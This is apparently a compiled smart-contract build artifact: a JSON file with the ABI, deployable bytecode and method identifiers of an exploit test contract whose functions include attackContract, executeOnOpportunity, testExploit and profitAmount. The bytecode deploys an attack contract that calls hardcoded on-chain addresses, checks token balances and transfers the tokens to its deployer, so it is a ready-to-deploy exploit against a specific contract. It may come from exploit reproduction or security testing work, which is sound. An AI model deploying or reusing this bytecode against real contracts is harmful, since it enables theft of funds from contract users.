{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"attackContract","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract AttackContract"}],"stateMutability":"view"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"pure"},{"type":"function","name":"testExploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x60e08060405234610112576105608181016001600160401b03811183821017610116578291610528833903905ff080156101315760808190526001600160a01b031660a05273ba5bde662c17e2adff1075610382b9b6912963503b1561013c576040516370a0823160e01b815230600482015260208160248173ba5bde662c17e2adff1075610382b9b6912963505afa908115610131575f916100d2575b5060c0525b6040516103e29081610146823960805181818160d3015261025a015260a051816102b9015260c051816101940152f35b905060203d60201161012a575b601f8101601f191682016001600160401b038111838210176101165760209183916040528101031261011257515f61009d565b5f80fd5b634e487b7160e01b5f52604160045260245ffd5b503d6100df565b6040513d5f823e3d90fd5b5f60c0526100a256fe60806040526004361015610011575f80fd5b5f3560e01c80633c2448ed1461005057806342af7437146100be57806349343624146100905780635ff972cc1461006e5763ca1ba02814610050575f80fd5b3461006a575f36600319011261006a57610068610222565b005b5f80fd5b3461006a575f36600319011261006a576020610088610138565b604051908152f35b3461006a575f36600319011261006a57602060405173ba5bde662c17e2adff1075610382b9b6912963508152f35b3461006a575f36600319011261006a576040517f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03168152602090f35b90601f8019910116810190811067ffffffffffffffff82111761012457604052565b634e487b7160e01b5f52604160045260245ffd5b73ba5bde662c17e2adff1075610382b9b6912963503b1561021e576040516370a0823160e01b815230600482015260208160248173ba5bde662c17e2adff1075610382b9b6912963505afa908115610213575f916101e1575b507f0000000000000000000000000000000000000000000000000000000000000000808211156101db5781039081116101c75790565b634e487b7160e01b5f52601160045260245ffd5b50505f90565b90506020813d60201161020b575b816101fc60209383610102565b8101031261006a57515f610191565b3d91506101ef565b6040513d5f823e3d90fd5b5f90565b73ffb512b9176d527c5d32189c3e310ed4ab2bb9ec3b15158061038e575b80610370575b156103385760405163c486ad3760e01b81527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031690602081600481855afa908115610213575f9161033e575b50801561033a5760405160208101906bffffffffffffffffffffffff197f000000000000000000000000000000000000000000000000000000000000000060601b168252826034820152603481526102f3605482610102565b51902090823b1561006a5760445f928360405195869485936335542bb760e01b8552600485015260248401525af180156102135761032e5750565b5f61033891610102565b565b5050565b90506020813d602011610368575b8161035960209383610102565b8101031261006a57515f61029a565b3d915061034c565b5073ba5bde662c17e2adff1075610382b9b6912963503b1515610246565b50733f4d749675b3e48bccd932033808a7079328eb483b151561024056fea26469706673582212205dc4a059472c5a8b2e307d43a2f32f11386a5f49b305beb8ef1cf5dfd633b05c64736f6c634300081e003360a080604052346022573360805261053990816100278239608051816102400152f35b5f80fdfe60806040526004361015610011575f80fd5b5f3560e01c806335542bb71461007a57806382b2e257146100605763c486ad371461003a575f80fd5b3461005c575f36600319011261005c57602061005461046f565b604051908152f35b5f80fd5b3461005c575f36600319011261005c5760206100546103e0565b3461005c57604036600319011261005c576100996024356004356100d1565b005b90601f8019910116810190811067ffffffffffffffff8211176100bd57604052565b634e487b7160e01b5f52604160045260245ffd5b5f90733f4d749675b3e48bccd932033808a7079328eb483b1580156103c3575b6103be57733f4d749675b3e48bccd932033808a7079328eb483b1561005c5760405190634783f0ef60e01b825260048201525f8160248183733f4d749675b3e48bccd932033808a7079328eb485af180156103b3576103a0575b5060209160405161015c848261009b565b8281525f368137733f4d749675b3e48bccd932033808a7079328eb483b1561039c5790826040518093632f52ebb760e01b8252604482019360048301526040602483015280518094528660648301910193835b888282106103825750505081929350038183733f4d749675b3e48bccd932033808a7079328eb485af1801561037757908291610362575b50506040516370a0823160e01b815230600482015290828260248173ba5bde662c17e2adff1075610382b9b6912963505afa918215610326578192610333575b508161023157505050565b60405163a9059cbb60e01b81527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03166004820152602481019290925282826044818473ba5bde662c17e2adff1075610382b9b6912963505af19182156103265781926102e5575b5050156102aa5750565b6064906040519062461bcd60e51b8252600482015260146024820152731490549157d514905394d1915497d1905253115160621b6044820152fd5b9091508281813d831161031f575b6102fd818361009b565b8101031261031b575190811515820361031857505f806102a0565b80fd5b5080fd5b503d6102f3565b50604051903d90823e3d90fd5b9091508281813d831161035b575b61034b818361009b565b8101031261005c5751905f610226565b503d610341565b8161036c9161009b565b61031857805f6101e6565b6040513d84823e3d90fd5b8651845295860195889550879450909201916001016101af565b8280fd5b6103ac91505f9061009b565b5f5f61014b565b6040513d5f823e3d90fd5b505050565b5073ba5bde662c17e2adff1075610382b9b6912963503b156100f1565b73ba5bde662c17e2adff1075610382b9b6912963503b1561046b576040516370a0823160e01b815230600482015260208160248173ba5bde662c17e2adff1075610382b9b6912963505afa9081156103b3575f9161043c575090565b90506020813d602011610463575b816104576020938361009b565b8101031261005c575190565b3d915061044a565b5f90565b733f4d749675b3e48bccd932033808a7079328eb483b1580156104e6575b61046b576040516370a0823160e01b8152733f4d749675b3e48bccd932033808a7079328eb48600482015260208160248173ba5bde662c17e2adff1075610382b9b6912963505afa9081156103b3575f9161043c575090565b5073ba5bde662c17e2adff1075610382b9b6912963503b1561048d56fea2646970667358221220a73ce3ae36943490f10840cdc116c4ca12a27770af4737b88cbb512ad36ffaa764736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"attackContract()":"42af7437","executeOnOpportunity()":"3c2448ed","profitAmount()":"5ff972cc","profitToken()":"49343624","testExploit()":"ca1ba028"},"id":0}